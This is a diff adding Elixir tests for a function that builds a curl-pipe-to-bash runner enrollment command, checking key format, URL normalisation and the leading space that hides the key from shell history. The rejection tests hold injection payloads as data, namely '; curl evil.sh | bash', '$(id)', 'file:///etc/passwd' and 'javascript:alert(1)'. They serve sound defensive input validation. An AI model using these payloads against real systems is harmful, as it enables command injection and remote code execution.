@@ -2128,6 +2128,84 @@ defmodule Emisar.RunnersTest do
     end
   end
 
+  describe "enrollment_install_command/2" do
+    # A syntactically real key (tag + 43 url-safe base64 chars) so the command
+    # under test is byte-for-byte the one an operator pastes.
+    @raw_secret "emkey-enroll-" <> String.duplicate("a", 43)
+
+    test "builds the canonical one-liner, leading space included" do
+      assert {:ok, command} =
+               Runners.enrollment_install_command(@raw_secret, "https://emisar.dev")
+
+      assert command ==
+               " curl -sSL https://emisar.dev/install.sh | sudo EMISAR_ENROLLMENT_KEY=#{@raw_secret} EMISAR_URL=https://emisar.dev bash"
+
+      # The leading space is load-bearing (HISTCONTROL=ignorespace), so it is
+      # asserted on its own — a trim anywhere upstream leaks the key to history.
+      assert String.starts_with?(command, " curl")
+    end
+
+    test "normalizes a single trailing slash off the base URL" do
+      assert {:ok, command} =
+               Runners.enrollment_install_command(@raw_secret, "https://emisar.dev/")
+
+      assert command ==
+               " curl -sSL https://emisar.dev/install.sh | sudo EMISAR_ENROLLMENT_KEY=#{@raw_secret} EMISAR_URL=https://emisar.dev bash"
+    end
+
+    test "a self-hosted http origin keeps its scheme and port" do
+      assert {:ok, command} =
+               Runners.enrollment_install_command(@raw_secret, "http://runners.internal:4000")
+
+      assert command ==
+               " curl -sSL http://runners.internal:4000/install.sh | sudo EMISAR_ENROLLMENT_KEY=#{@raw_secret} EMISAR_URL=http://runners.internal:4000 bash"
+    end
+
+    test "refuses a key that isn't the minted enrollment-key shape" do
+      assert Runners.enrollment_install_command("emkey-enroll-short", "https://emisar.dev") ==
+               {:error, :invalid_enrollment_key}
+
+      assert Runners.enrollment_install_command(
+               "emk-#{String.duplicate("a", 43)}",
+               "https://emisar.dev"
+             ) ==
+               {:error, :invalid_enrollment_key}
+
+      assert Runners.enrollment_install_command(
+               "#{@raw_secret} ; curl evil.sh | bash",
+               "https://emisar.dev"
+             ) == {:error, :invalid_enrollment_key}
+
+      assert Runners.enrollment_install_command("#{@raw_secret}\n", "https://emisar.dev") ==
+               {:error, :invalid_enrollment_key}
+
+      assert Runners.enrollment_install_command(nil, "https://emisar.dev") ==
+               {:error, :invalid_enrollment_key}
+    end
+
+    test "refuses a base URL that is more than a plain http(s) origin" do
+      for base <- [
+            "https://emisar.dev; curl evil.sh | bash",
+            "https://emisar.dev$(id)",
+            "https://emisar.dev /install.sh",
+            "https://user:pass@emisar.dev",
+            "https://emisar.dev/enroll",
+            "https://emisar.dev//",
+            "https://emisar.dev?x=1",
+            "https://emisar.dev#frag",
+            "https://emisar.dev:99999",
+            "file:///etc/passwd",
+            "javascript:alert(1)",
+            "emisar.dev",
+            "",
+            nil
+          ] do
+        assert Runners.enrollment_install_command(@raw_secret, base) ==
+                 {:error, :invalid_base_url}
+      end
+    end
+  end
+
   describe "subscribe_connections/1" do
     test "the subscriber receives this account's presence diffs" do
       account = Fixtures.Accounts.create_account()
